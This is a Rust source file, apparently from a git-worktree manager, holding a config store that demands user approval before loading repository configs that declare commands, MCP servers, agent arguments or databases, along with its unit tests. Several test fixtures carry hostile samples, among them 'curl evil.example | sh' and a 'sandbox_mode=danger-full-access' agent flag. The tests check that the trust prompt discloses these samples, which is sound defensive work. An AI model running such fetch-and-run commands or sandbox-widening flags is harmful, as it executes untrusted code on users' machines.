fn argv_words(value: &Value) -> Vec<String> {
    match value {
        Value::Array(items) => items.iter().map(argv_word).collect(),
        other => vec![argv_word(other)],
    }
}

fn push_argv(out: &mut Vec<Vec<String>>, argv: Vec<String>) {
    if !argv.is_empty() && !out.contains(&argv) {
        out.push(argv);
    }
}

/// Database network capabilities in a raw config layer, with credentials omitted.
///
/// This intentionally runs before deserialization for the same reason command collection does: a
/// broken config still has to disclose what approving it would permit.
fn declared_databases_in(value: &Value) -> Vec<DatabaseTrustDeclaration> {
    let Some(databases) = value.get("database").and_then(Value::as_table) else {
        return Vec::new();
    };

    databases
        .iter()
        .filter_map(|(id, value)| {
            let table = value.as_table()?;
            let engine = table
                .get("engine")
                .and_then(Value::as_str)
                .unwrap_or("unknown")
                .to_owned();
            let target = if table.contains_key("url") {
                "configured URL".to_owned()
            } else if let Some(path) = table.get("path").and_then(Value::as_str) {
                path.to_owned()
            } else {
                let host = table
                    .get("host")
                    .and_then(Value::as_str)
                    .unwrap_or("configured host");
                table
                    .get("port")
                    .and_then(Value::as_str)
                    .map_or_else(|| host.to_owned(), |port| format!("{host}:{port}"))
            };
            Some(DatabaseTrustDeclaration {
                id: id.clone(),
                engine,
                target,
                password_configured: table.contains_key("password"),
            })
        })
        .collect()
}

fn collect_runs(value: &Value, out: &mut Vec<Vec<String>>) {
    match value {
        Value::Table(table) => {
            if let Some(Value::Array(items)) = table.get("run") {
                push_argv(out, items.iter().map(argv_word).collect());
            }
            for nested in table.values() {
                collect_runs(nested, out);
            }
        }
        Value::Array(items) => {
            for item in items {
                collect_runs(item, out);
            }
        }
        _ => {}
    }
}

impl ConfigStore for FileConfigStore {
    fn load(&self, repo_root: &Path) -> Result<Project, ConfigError> {
        let loaded = self.read_layers(repo_root)?;
        let fingerprint = Self::fingerprint(&loaded);

        if let Some(entry) = self.cache.lock().get(repo_root)
            && entry.fingerprint == fingerprint
        {
            return Ok(entry.project.clone());
        }

        self.enforce_trust(&loaded)?;
        let project = self.resolve(repo_root, &loaded)?;

        self.cache.lock().insert(
            repo_root.to_path_buf(),
            CacheEntry {
                project: project.clone(),
                fingerprint,
            },
        );

        Ok(project)
    }

    fn provenance(&self, repo_root: &Path) -> Result<Vec<LayerProvenance>, ConfigError> {
        Ok(self
            .read_layers(repo_root)?
            .into_iter()
            .map(|l| LayerProvenance {
                layer: l.layer,
                path: l.path,
            })
            .collect())
    }

    fn set_trust(&self, path: &Path, decision: TrustDecision) -> Result<(), ConfigError> {
        let source = read_optional(path)?.ok_or_else(|| ConfigError::Io {
            path: path.to_path_buf(),
            message: "cannot record a decision for a file that no longer exists".to_owned(),
        })?;

        let mut store = self.trust_store();
        store.record(path, &source, decision, Some(self.clock.now_iso()));
        self.paths.ensure_dir()?;
        store.save(&self.paths.trust_file)?;
        self.trust_revision.fetch_add(1, Ordering::AcqRel);

        // A decision changes what `load` may do, so drop the cache.
        self.cache.lock().clear();
        Ok(())
    }

    fn is_trusted(&self, path: &Path) -> Result<bool, ConfigError> {
        let Some(source) = read_optional(path)? else {
            return Ok(false);
        };
        Ok(self.trust_store().is_approved(path, &source))
    }

    fn projects(&self) -> Result<Vec<PathBuf>, ConfigError> {
        Ok(self.user_config()?.project_roots())
    }

    fn register_project(&self, repo_root: &Path) -> Result<(), ConfigError> {
        // Verify it is a repository before recording it, so a typo fails here rather
        // than becoming a permanently broken sidebar entry.
        let root = self.git.repo_root(repo_root).map_err(|e| ConfigError::Io {
            path: repo_root.to_path_buf(),
            message: format!("not a git repository: {e}"),
        })?;

        let _write = self.user_write.lock();
        let mut config = self.user_config()?;
        config.register(&root, self.clock.today());
        self.save_user_config(&config)
    }

    fn unregister_project(&self, repo_root: &Path) -> Result<(), ConfigError> {
        let _write = self.user_write.lock();
        let mut config = self.user_config()?;
        config.unregister(repo_root);
        self.save_user_config(&config)?;
        self.cache.lock().remove(repo_root);
        Ok(())
    }

    fn user_pref(&self, key: &str) -> Result<Option<String>, ConfigError> {
        Ok(self.user_config()?.pref(key))
    }

    fn set_user_pref(&self, key: &str, value: &str) -> Result<(), ConfigError> {
        let _write = self.user_write.lock();
        let mut config = self.user_config()?;
        config.set_pref(key, value);
        self.save_user_config(&config)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use wtm_render::Engine;
    use wtm_testkit::{FakeClock, FakeGit};

    struct Harness {
        store: FileConfigStore,
        repo: PathBuf,
        _config_dir: tempfile::TempDir,
        _repo_dir: tempfile::TempDir,
    }

    impl Harness {
        fn new() -> Self {
            let config_dir = tempfile::tempdir().unwrap();
            let repo_dir = tempfile::tempdir().unwrap();
            let repo = repo_dir.path().to_path_buf();
            std::fs::create_dir_all(repo.join(".git")).unwrap();

            let git = Arc::new(FakeGit::with_main(repo.clone(), "main"));
            let store = FileConfigStore::new(
                AppPaths::rooted(config_dir.path()),
                git,
                Arc::new(Engine::new()),
                Arc::new(FakeClock::new()),
            );

            Self {
                store,
                repo,
                _config_dir: config_dir,
                _repo_dir: repo_dir,
            }
        }

        fn write_repo_config(&self, contents: &str) {
            std::fs::write(self.repo.join("wtm.toml"), contents).unwrap();
        }

        fn write_local_config(&self, contents: &str) {
            std::fs::write(self.repo.join(".git/wtm.local.toml"), contents).unwrap();
        }

        fn write_user_config(&self, contents: &str) {
            std::fs::write(&self.store.paths().config_file, contents).unwrap();
        }

        fn approve(&self, filename: &str) {
            let path = if filename == "wtm.toml" {
                self.repo.join("wtm.toml")
            } else {
                self.repo.join(".git").join(filename)
            };
            self.store.set_trust(&path, TrustDecision::Approve).unwrap();
        }
    }

    #[test]
    fn a_repo_with_no_config_loads_the_built_in_defaults() {
        // The zero-configuration promise.
        let h = Harness::new();
        let project = h.store.load(&h.repo).unwrap();
        assert!(
            project.field("name").is_some(),
            "the default form must be present"
        );
        assert!(project.field("base").is_some());
        assert_eq!(project.root, h.repo);
    }

    #[test]
    fn a_config_with_no_commands_needs_no_trust_prompt() {
        // Only executable content is a trust boundary.
        let h = Harness::new();
        h.write_repo_config("[naming]\nbranch = '{{ name | slugify }}-x'\n");
        let project = h.store.load(&h.repo).unwrap();
        assert!(project.naming.branch.ends_with("-x"));
    }

    /// The security gate.
    #[test]
    fn a_config_declaring_a_command_is_refused_until_approved() {
        let h = Harness::new();
        h.write_repo_config("[setup]\nrun = ['./bin/setup.sh', '{{ worktree.path }}']\n");

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Untrusted { commands, path, .. } => {
                assert_eq!(path, h.repo.join("wtm.toml"));
                assert!(
                    commands
                        .iter()
                        .any(|c| c.first().map(String::as_str) == Some("./bin/setup.sh")),
                    "the prompt must show what would run: {commands:?}"
                );
            }
            other => panic!("expected Untrusted, got {other:?}"),
        }

        h.approve("wtm.toml");
        let project = h.store.load(&h.repo).unwrap();
        assert!(project.setup.is_some());
    }

    #[test]
    fn a_config_declaring_a_database_is_refused_until_approved_without_disclosing_credentials() {
        let h = Harness::new();
        h.write_repo_config(
            "[database.local]\nengine = 'postgres'\nhost = '127.0.0.1'\n\
             port = '{{ env.DB_PORT }}'\npassword = 'do-not-display'\n",
        );

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Untrusted {
                commands,
                databases,
                path,
                ..
            } => {
                assert_eq!(path, h.repo.join("wtm.toml"));
                assert!(commands.is_empty());
                assert_eq!(databases.len(), 1);
                assert_eq!(databases[0].id, "local");
                assert_eq!(databases[0].engine, "postgres");
                assert_eq!(databases[0].target, "127.0.0.1:{{ env.DB_PORT }}");
                assert!(databases[0].password_configured);
                assert!(!format!("{databases:?}").contains("do-not-display"));
            }
            other => panic!("expected Untrusted, got {other:?}"),
        }

        h.approve("wtm.toml");
        let project = h.store.load(&h.repo).unwrap();
        assert!(project.database.contains_key("local"));
    }

    #[test]
    fn editing_an_approved_config_re_arms_the_prompt() {
        let h = Harness::new();
        h.write_repo_config("[setup]\nrun = ['./bin/setup.sh']\n");
        h.approve("wtm.toml");
        h.store.load(&h.repo).unwrap();

        // Someone (or a `git pull`) changes the command.
        h.write_repo_config("[setup]\nrun = ['curl', 'evil.example']\n");
        assert!(
            matches!(h.store.load(&h.repo), Err(ConfigError::Untrusted { .. })),
            "a changed command must not inherit the old approval"
        );
    }

    #[test]
    fn the_trust_prompt_lists_commands_from_every_site() {
        let h = Harness::new();
        h.write_repo_config(
            "[[field]]\nkey = 'env'\nlabel = 'Env'\nkind = 'select'\n\
             [field.options]\nkind = 'command'\nrun = ['./bin/envs.sh']\n\n\
             [[lookup]]\nid = 'jira'\nrun = ['acli', 'jira', 'view']\n\n\
             [setup]\nrun = ['./bin/setup.sh']\n\n\
             [[remove.pre]]\nrun = ['docker', 'compose', 'down']\n\n\
             [remove.command]\nrun = ['./bin/teardown.sh']\n\n\
             [[action]]\nid = 'start'\nlabel = 'Start'\nrun = ['just', 'start']\n\n\
             [agent.claude]\nextra_args = ['--verbose']\n\n\
             [agent.claude.mcp.docs]\ncommand = 'npx'\n",
        );

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Untrusted { commands, .. } => {
                let programs: Vec<&str> = commands
                    .iter()
                    .filter_map(|c| c.first().map(String::as_str))
                    .collect();
                for expected in [
                    "./bin/envs.sh",
                    "acli",
                    "./bin/setup.sh",
                    "docker",
                    "./bin/teardown.sh",
                    "just",
                    "claude",
                    "npx",
                ] {
                    assert!(
                        programs.contains(&expected),
                        "missing {expected} in {programs:?}"
                    );
                }
            }
            other => panic!("expected Untrusted, got {other:?}"),
        }
    }

    /// An MCP server is spelled `command` and `args`, not `run`, and it starts when a session opens.
    /// A file declaring nothing else was once loaded without a prompt, so opening an agent in a
    /// freshly cloned repository could run a program nobody had approved.
    #[test]
    fn an_agent_mcp_server_is_refused_until_approved() {
        let h = Harness::new();
        h.write_repo_config(
            "[agent.claude.mcp.docs]\ncommand = 'npx'\nargs = ['-y', '@example/docs-mcp']\n",
        );

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Untrusted { commands, .. } => assert!(
                commands.contains(&vec![
                    "npx".to_owned(),
                    "-y".to_owned(),
                    "@example/docs-mcp".to_owned()
                ]),
                "the prompt must show the server's argv: {commands:?}"
            ),
            other => panic!("expected Untrusted, got {other:?}"),
        }

        h.approve("wtm.toml");
        let project = h.store.load(&h.repo).unwrap();
        assert!(project.agent["claude"].mcp.contains_key("docs"));
    }

    /// `extra_args` reach the agent CLI's own argv, where one flag can widen what the agent may do
    /// or point it at another MCP config. The CLI itself comes from the compiled catalogue, so the
    /// prompt names the agent and elides the catalogue's arguments instead of inventing them.
    #[test]
    fn extra_arguments_for_an_agent_are_refused_until_approved() {
        let h = Harness::new();
        h.write_repo_config(
            "[agent.codex]\nextra_args = ['-c', 'sandbox_mode=danger-full-access']\n",
        );

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Untrusted { commands, .. } => assert!(
                commands.contains(&vec![
                    "codex".to_owned(),
                    "…".to_owned(),
                    "-c".to_owned(),
                    "sandbox_mode=danger-full-access".to_owned()
                ]),
                "the prompt must show the arguments and which agent gets them: {commands:?}"
            ),
            other => panic!("expected Untrusted, got {other:?}"),
        }

        h.approve("wtm.toml");
        assert!(h.store.load(&h.repo).is_ok());
    }

    /// An agent's environment runs code as surely as its arguments do — `NODE_OPTIONS` loads a
    /// script into Claude Code, and a base URL decides which server reads the worktree — so a layer
    /// declaring nothing but `[agent.<id>.env]` still has to be approved. It shares one line with
    /// `extra_args`, written the way a shell would put the two together, because that line is what
    /// the agent will actually be started with.
    #[test]
    fn an_agents_environment_is_refused_until_approved_and_shown_beside_its_arguments() {
        let h = Harness::new();
        h.write_repo_config(
            "[agent.claude]\nextra_args = ['--verbose']\n\n\
             [agent.claude.env]\nNODE_OPTIONS = '--require ./hook.js'\n",
        );

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Untrusted { commands, .. } => assert_eq!(
                commands,
                vec![vec![
                    "NODE_OPTIONS=--require ./hook.js".to_owned(),
                    "claude".to_owned(),
                    "…".to_owned(),
                    "--verbose".to_owned(),
                ]],
                "the prompt must show the variable, its value and which agent gets it"
            ),
            other => panic!("expected Untrusted, got {other:?}"),
        }

        h.approve("wtm.toml");
        let project = h.store.load(&h.repo).unwrap();
        assert_eq!(
            project.agent["claude"].env["NODE_OPTIONS"],
            "--require ./hook.js"
        );
    }

    /// The other half of the agent rule: choosing a model or a mode starts no process of the
    /// repository's choosing, and a prompt for it would teach people to click through prompts.
    #[test]
    fn agent_settings_that_start_no_process_need_no_trust_prompt() {
        let h = Harness::new();
        h.write_repo_config(
            "[agent.claude]\nmodel = 'opus'\nmode = 'plan'\nfast = true\nextra_args = []\n\n\
             [agent.cursor]\nenabled = false\n",
        );
        let project = h.store.load(&h.repo).unwrap();
        assert_eq!(project.agent["claude"].model.as_deref(), Some("opus"));
    }

    /// A repository's `wtm.toml` that declares nothing but an environment still runs programs: a
    /// service's `start` the first time someone presses Start, its `stop`, its `logs` and its
    /// health `command`. None of those is spelled `run`, which is how an `[agent]`'s MCP server once
    /// got past this gate, so the prompt has to list each of them.
    #[test]
    fn an_environment_only_config_is_refused_until_approved_and_lists_every_process_it_would_start()
    {
        let h = Harness::new();
        h.write_repo_config(
            "[[environment.service]]\nid = 'web'\nstart = ['just', 'up', 'web']\n\
             stop = ['just', 'down', 'web']\nlogs = ['docker', 'compose', 'logs', 'web']\ndetached = true\n\
             health = { command = ['./bin/ready.sh'] }\n\n\
             [[environment.resource]]\nid = 'db'\nisolation = 'shared'\n\n\
             [[environment.command]]\nid = 'reset'\nrun = ['just', 'reset-db']\n\
             destructive = true\nresources = ['db']\n",
        );

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Untrusted { commands, .. } => {
                let words =
                    |argv: &[&str]| argv.iter().map(|w| (*w).to_owned()).collect::<Vec<_>>();
                for expected in [
                    words(&["just", "up", "web"]),
                    words(&["just", "down", "web"]),
                    words(&["docker", "compose", "logs", "web"]),
                    words(&["./bin/ready.sh"]),
                    words(&["just", "reset-db"]),
                ] {
                    assert!(
                        commands.contains(&expected),
                        "the prompt must show {expected:?}: {commands:?}"
                    );
                }
            }
            other => panic!("expected Untrusted, got {other:?}"),
        }

        h.approve("wtm.toml");
        let project = h.store.load(&h.repo).unwrap();
        assert_eq!(project.environment.services[0].id, "web");
    }

    /// The plan's acceptance for E1, in its own words: an env-only `wtm.toml` change prompts trust.
    /// A `git pull` that changes only what Start runs must not inherit the approval of what it ran
    /// before.
    #[test]
    fn changing_only_the_environment_of_an_approved_config_prompts_again() {
        let h = Harness::new();
        let service = |start: &str| {
            format!(
                "[[environment.service]]\nid = 'web'\nstart = {start}\n\
                 health = {{ url = 'http://localhost:8123/' }}\n"
            )
        };
        h.write_repo_config(&service("['just', 'up']"));
        h.approve("wtm.toml");
        h.store.load(&h.repo).unwrap();

        h.write_repo_config(&service("['sh', '-c', 'curl evil.example | sh']"));
        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Untrusted { commands, .. } => assert!(commands.contains(&vec![
                "sh".to_owned(),
                "-c".to_owned(),
                "curl evil.example | sh".to_owned()
            ])),
            other => panic!("a changed service must not inherit the old approval: {other:?}"),
        }
    }

    /// A health URL and a preview start no process, and only addresses on this machine are fetched
    /// or opened, so a resource alone, which runs nothing, needs no prompt either.
    #[test]
    fn declaring_only_a_resource_needs_no_trust_prompt() {
        let h = Harness::new();
        h.write_repo_config("[[environment.resource]]\nid = 'db'\nisolation = 'shared'\n");
        let project = h.store.load(&h.repo).unwrap();
        assert_eq!(project.environment.resources.len(), 1);
    }

    #[test]
    fn an_invalid_config_still_shows_its_commands_in_the_prompt() {
        // Trust is checked before validation on purpose: refusing to say what a broken
        // config would run is exactly backwards.
        let h = Harness::new();
        h.write_repo_config("[setup]\nrun = ['./bin/setup.sh']\n\n[naming]\nbranch = '{{ oops'\n");
        assert!(matches!(
            h.store.load(&h.repo),
            Err(ConfigError::Untrusted { .. })
        ));
    }

    #[test]
    fn the_local_layer_overrides_the_repo_layer() {
        let h = Harness::new();
        h.write_repo_config("[naming]\nbranch = 'from-repo'\ndirectory = 'from-repo'\n");
        h.write_local_config("[naming]\nbranch = 'from-local'\n");

        let project = h.store.load(&h.repo).unwrap();
        assert_eq!(project.naming.branch, "from-local");
        assert_eq!(
            project.naming.directory, "from-repo",
            "untouched keys survive"
        );
    }

    #[test]
    fn both_repo_and_local_layers_are_trust_checked_independently() {
        let h = Harness::new();
        h.write_repo_config("[setup]\nrun = ['./bin/setup.sh']\n");
        h.write_local_config("[[action]]\nid = 'x'\nlabel = 'X'\nrun = ['./bin/local.sh']\n");

        h.approve("wtm.toml");
        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Untrusted { path, .. } => {
                assert!(
                    path.ends_with("wtm.local.toml"),
                    "the local layer needs its own approval"
                );
            }
            other => panic!("expected Untrusted for the local layer, got {other:?}"),
        }

        h.approve("wtm.local.toml");
        h.store.load(&h.repo).unwrap();
    }

    #[test]
    fn provenance_reports_which_layers_contributed() {
        let h = Harness::new();
        assert_eq!(
            h.store.provenance(&h.repo).unwrap().len(),
            1,
            "only the built-in layer with no files present"
        );

        h.write_repo_config("[naming]\nbranch = 'x'\n");
        let layers = h.store.provenance(&h.repo).unwrap();
        assert_eq!(layers.len(), 2);
        assert_eq!(layers[0].layer, ConfigLayer::BuiltIn);
        assert_eq!(layers[1].layer, ConfigLayer::Repo);
    }

    #[test]
    fn a_validation_error_names_the_most_specific_file() {
        let h = Harness::new();
        h.write_repo_config("[naming]\nbranch = 'ok'\n");
        h.write_local_config("[naming]\nbranch = '{{ worktree.path }}'\n");

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid { path, layer, .. } => {
                assert!(path.ends_with("wtm.local.toml"), "got {}", path.display());
                assert_eq!(layer, ConfigLayer::Local);
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn a_toml_syntax_error_reports_a_line() {
        let h = Harness::new();
        h.write_repo_config("[naming\nbranch = 'x'\n");
        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid { line, .. } => assert!(line.is_some(), "expected a line number"),
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn the_cache_is_invalidated_when_a_layer_file_changes() {
        let h = Harness::new();
        h.write_repo_config("[naming]\nbranch = 'first'\n");
        assert_eq!(h.store.load(&h.repo).unwrap().naming.branch, "first");

        h.write_repo_config("[naming]\nbranch = 'second'\n");
        assert_eq!(
            h.store.load(&h.repo).unwrap().naming.branch,
            "second",
            "an edit must invalidate the cache"
        );
    }

    #[test]
    fn adding_a_local_layer_invalidates_the_cache() {
        let h = Harness::new();
        h.write_repo_config("[naming]\nbranch = 'repo'\n");
        h.store.load(&h.repo).unwrap();

        h.write_local_config("[naming]\nbranch = 'local'\n");
        assert_eq!(h.store.load(&h.repo).unwrap().naming.branch, "local");
    }

    #[test]
    fn projects_can_be_registered_and_unregistered() {
        let h = Harness::new();
        assert!(h.store.projects().unwrap().is_empty());

        h.store.register_project(&h.repo).unwrap();
        assert_eq!(h.store.projects().unwrap().len(), 1);

        // Registering twice must not duplicate.
        h.store.register_project(&h.repo).unwrap();
        assert_eq!(h.store.projects().unwrap().len(), 1);

        h.store.unregister_project(&h.repo).unwrap();
        assert!(h.store.projects().unwrap().is_empty());
    }

    #[test]
    fn user_preferences_round_trip() {
        let h = Harness::new();
        // There is always a theme — `system` is a real value, not an absence.
        assert_eq!(
            h.store.user_pref("ui.theme").unwrap().as_deref(),
            Some("system")
        );
        h.store.set_user_pref("ui.theme", "dark").unwrap();
        assert_eq!(
            h.store.user_pref("ui.theme").unwrap().as_deref(),
            Some("dark")
        );
        h.store.set_user_pref("ui.theme", "light").unwrap();
        assert_eq!(
            h.store.user_pref("ui.theme").unwrap().as_deref(),
            Some("light")
        );
    }

    #[test]
    fn declared_commands_finds_run_arrays_at_any_depth() {
        let value = layers::document("[a.b.c]\nrun = ['x', 'y']\n\n[[d]]\nrun = ['z']\n").unwrap();
        let found = declared_commands_in(&value);
        assert!(
            found.contains(&vec!["x".to_owned(), "y".to_owned()]),
            "got {found:?}"
        );
        assert!(found.contains(&vec!["z".to_owned()]), "got {found:?}");
    }

    #[test]
    fn declared_commands_deduplicates() {
        let value = layers::document("[a]\nrun = ['x']\n\n[b]\nrun = ['x']\n").unwrap();
        assert_eq!(declared_commands_in(&value).len(), 1);
    }

    /// Like `run`, an MCP server must be disclosed even when the file will not validate. A
    /// mistyped `args` is still a program the repository named.
    #[test]
    fn declared_commands_show_an_mcp_server_whose_args_are_malformed() {
        let value =
            layers::document("[agent.claude.mcp.docs]\ncommand = './bin/mcp'\nargs = '--serve'\n")
                .unwrap();
        assert_eq!(
            declared_commands_in(&value),
            vec![vec!["./bin/mcp".to_owned(), "--serve".to_owned()]]
        );
    }

    #[test]
    fn declared_databases_only_report_targets_and_password_presence() {
        let value = layers::document(
            "[database.production]\nengine = 'postgres'\n\
             url = 'postgres://person:secret@example.invalid/app'\npassword = 'secret'\n",
        )
        .unwrap();
        let found = declared_databases_in(&value);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].target, "configured URL");
        assert!(found[0].password_configured);
        assert!(!format!("{found:?}").contains("secret"));
    }

    fn starring(worktree: &str) -> SidebarLayout {
        SidebarLayout {
            groups: vec![crate::sidebar::SidebarGroup {
                id: crate::sidebar::FAVORITES.to_owned(),
                worktrees: vec![worktree.to_owned()],
                ..crate::sidebar::SidebarGroup::default()
            }],
            ..SidebarLayout::default()
        }
    }

    fn starred(layout: &SidebarLayout) -> Vec<String> {
        layout.groups[0].worktrees.clone()
    }

    #[test]
    fn a_sidebar_layout_persists_to_disk_and_can_be_cleared() {
        let h = Harness::new();
        h.store.register_project(&h.repo).unwrap();

        let a = h.repo.join("../wt-a").to_string_lossy().into_owned();
        h.store.set_sidebar_layout(&h.repo, &starring(&a)).unwrap();
        assert_eq!(starred(&h.store.sidebar_layout(&h.repo).unwrap()), [a]);

        h.store
            .set_sidebar_layout(&h.repo, &SidebarLayout::default())
            .unwrap();
        assert!(starred(&h.store.sidebar_layout(&h.repo).unwrap()).is_empty());
    }

    #[test]
    fn writing_a_layout_does_not_disturb_the_rest_of_the_app_config() {
        // The whole file is rewritten for one drag, so the round-trip has to be safe.
        let h = Harness::new();
        h.store.register_project(&h.repo).unwrap();
        h.store.set_user_pref("ui.theme", "dark").unwrap();

        h.store
            .set_sidebar_layout(&h.repo, &starring("/wt-a"))
            .unwrap();

        assert_eq!(
            h.store.user_pref("ui.theme").unwrap().as_deref(),
            Some("dark"),
            "an unrelated preference must survive a layout write"
        );
        assert_eq!(
            h.store.projects().unwrap(),
            vec![h.repo.clone()],
            "registration must survive a layout write"
        );
    }

    #[test]
    fn a_layout_for_an_unregistered_project_is_ignored_rather_than_an_error() {
        // Reachable only if the UI got ahead of the config; it must not create a phantom
        // project, and it must not fail the drag either.
        let h = Harness::new();
        let answer = h
            .store
            .set_sidebar_layout(&h.repo, &starring("/wt-a"))
            .unwrap();
        assert_eq!(
            starred(&answer),
            ["/wt-a"],
            "the caller still gets its layout back"
        );
        assert!(h.store.projects().unwrap().is_empty());
        assert!(starred(&h.store.sidebar_layout(&h.repo).unwrap()).is_empty());
    }

    #[test]
    fn a_layout_write_that_changes_nothing_does_not_touch_the_file() {
        let h = Harness::new();
        h.store.register_project(&h.repo).unwrap();
        h.store
            .set_sidebar_layout(&h.repo, &starring("/wt-a"))
            .unwrap();
        // A comment is the marker because a rewrite cannot keep one: serde drops comments, so
        // this detects a write where a timestamp might be too coarse to.
        let file = &h.store.paths().config_file;
        std::fs::write(
            file,
            std::fs::read_to_string(file).unwrap() + "\n# marker\n",
        )
        .unwrap();

        h.store
            .set_sidebar_layout(&h.repo, &starring("/wt-a"))
            .unwrap();

        let text = std::fs::read_to_string(file).unwrap();
        assert!(
            text.contains("# marker"),
            "an unchanged layout must not rewrite the file"
        );
    }

    #[test]
    fn forgetting_a_worktree_removes_it_from_the_stored_layout() {
        let h = Harness::new();
        h.store.register_project(&h.repo).unwrap();
        h.store
            .set_sidebar_layout(&h.repo, &starring("/wt-a"))
            .unwrap();

        h.store
            .forget_worktree_in_sidebar(&h.repo, "/wt-a")
            .unwrap();
        assert!(starred(&h.store.sidebar_layout(&h.repo).unwrap()).is_empty());
    }

    #[test]
    fn a_project_with_no_config_file_reads_as_an_empty_layout() {
        let h = Harness::new();
        assert!(h.store.sidebar_layout(&h.repo).unwrap().is_empty());
    }

    /// The review recipe the Work view's first slice runs, as you would write it in your own
    /// config. TOML rather than structs so the table shapes are what is under test.
    const RECIPE: &str = r#"
[defaults.workflow.role.conventions]
objective = "Check the change against the instruction sources and rules"
provider = "claude"
model = "opus"
inputs = ["diff", "instructions", "rules"]
fallback = "conventions-codex"

[defaults.workflow.role.conventions-codex]
objective = "The same check, on Codex"
provider = "codex"
inputs = ["diff", "instructions", "rules"]

[defaults.workflow.role.correctness]
objective = "Find bugs the change introduces"
provider = "codex"
effort = "high"
skills = ["/team-review"]
inputs = ["diff"]

[[defaults.workflow.recipe.review.stage]]
roles = ["conventions", "correctness"]
"#;

    #[test]
    fn recipes_and_roles_in_your_own_config_reach_the_project() {
        let h = Harness::new();
        h.write_user_config(RECIPE);

        let project = h.store.load(&h.repo).unwrap();
        let workflow = project.workflow.expect("the [workflow] table");
        assert_eq!(
            workflow.recipe["review"].stages[0].roles,
            vec!["conventions", "correctness"]
        );
        assert_eq!(
            workflow.role["conventions"].fallback,
            wtm_core::flow::Fallback::Role("conventions-codex".to_owned())
        );
        assert_eq!(
            workflow.role["correctness"]
                .skill_names()
                .collect::<Vec<_>>(),
            vec!["team-review"]
        );
    }

    #[test]
    fn a_project_without_a_workflow_table_has_none() {
        let h = Harness::new();
        assert!(h.store.load(&h.repo).unwrap().workflow.is_none());
    }

    #[test]
    fn one_project_can_change_one_role_without_restating_the_others() {
        // Keyed tables merge per key, which is the reason roles are not an array of tables.
        let h = Harness::new();
        let project_key = h.repo.to_string_lossy().replace('\\', "\\\\");
        h.write_user_config(&format!(
            "{RECIPE}\n[projects.\"{project_key}\".config.workflow.role.correctness]\nmodel = \"gpt-6\"\n"
        ));

        let workflow = h.store.load(&h.repo).unwrap().workflow.unwrap();
        assert_eq!(workflow.role["correctness"].model.as_deref(), Some("gpt-6"));
        assert_eq!(workflow.role["correctness"].effort.as_deref(), Some("high"));
        assert!(workflow.role.contains_key("conventions"));
    }

    #[test]
    fn a_repository_cannot_declare_roles_or_recipes() {
        let h = Harness::new();
        h.write_repo_config(
            "[workflow.role.sneaky]\nobjective = 'x'\nprovider = 'claude'\n\
             inputs = ['diff']\nmcp = ['slack']\n",
        );

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid {
                path, layer, key, ..
            } => {
                assert_eq!(path, h.repo.join("wtm.toml"));
                assert_eq!(layer, ConfigLayer::Repo);
                assert_eq!(key.as_deref(), Some("workflow.role"));
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn a_repository_cannot_choose_the_planner_that_spends_your_account() {
        // Naming the planner is choosing which role runs, by itself, as soon as a started issue has
        // its worktree: the same decision as declaring a role.
        let h = Harness::new();
        h.write_repo_config("[workflow]\nplanner = 'conventions'\n");
        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid { layer, key, .. } => {
                assert_eq!(layer, ConfigLayer::Repo);
                assert_eq!(key.as_deref(), Some("workflow.planner"));
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn a_repository_cannot_choose_the_designer_that_spends_your_account() {
        // The designer runs by itself once you approve a plan that asks for a design: naming it is
        // the planner's decision again.
        let h = Harness::new();
        h.write_repo_config("[workflow]\ndesigner = 'conventions'\n");
        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid { layer, key, .. } => {
                assert_eq!(layer, ConfigLayer::Repo);
                assert_eq!(key.as_deref(), Some("workflow.designer"));
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn a_repository_cannot_choose_the_writer_that_implements_an_approved_plan() {
        // Approving a plan starts this writer by itself, in the worktree, on your account.
        let h = Harness::new();
        h.write_repo_config("[workflow.implement]\nwriter = 'conventions'\nrecipe = 'review'\n");
        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid { layer, key, .. } => {
                assert_eq!(layer, ConfigLayer::Repo);
                assert_eq!(key.as_deref(), Some("workflow.implement"));
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn a_repository_cannot_declare_a_check_wtm_would_run_outside_the_sandbox() {
        let h = Harness::new();
        h.write_repo_config("[workflow.check.unit]\nrun = ['curl', 'https://example.invalid']\n");
        // Trusting the file is not enough: the trust prompt approves commands for setup, and a
        // check is run at a model's request, which is not what the prompt asked about.
        h.approve("wtm.toml");

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid { layer, key, .. } => {
                assert_eq!(layer, ConfigLayer::Repo);
                assert_eq!(key.as_deref(), Some("workflow.check"));
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn a_repository_cannot_let_a_review_start_services_by_itself() {
        let h = Harness::new();
        h.write_repo_config("[workflow]\nstart_services = \"auto\"\n");
        h.approve("wtm.toml");

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid { layer, key, .. } => {
                assert_eq!(layer, ConfigLayer::Repo);
                assert_eq!(key.as_deref(), Some("workflow.start_services"));
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn a_repository_cannot_name_the_forge_that_spends_your_sign_in() {
        let h = Harness::new();
        h.write_repo_config("[workflow]\nforge = \"github\"\nintegration_branches = [\"main\"]\n");

        match h.store.load(&h.repo).unwrap_err() {
